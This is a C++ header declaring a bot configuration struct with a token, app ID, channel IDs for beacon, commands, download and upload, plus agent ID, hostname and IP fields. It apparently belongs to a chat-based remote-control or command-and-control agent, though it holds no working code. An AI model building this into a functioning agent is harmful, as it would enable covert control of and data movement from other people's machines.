#pragma once
#include <string>

namespace config {
    struct BotConfig {
        std::string token;
        std::string appId;
        std::string beacon_chanel_id;
        std::string commands_chanel_id;
        std::string download_chanel_id;
        std::string upload_chanel_id;

        std::wstring w_token;
        std::wstring w_appId;

        int64_t agent_id;
        std::string hostname;
        std::string ip;

        std::string timezone_name;
        int timezone_offset_minutes;
        bool use_dst;
    };

    extern BotConfig cfg;
    BotConfig initialize_config();
}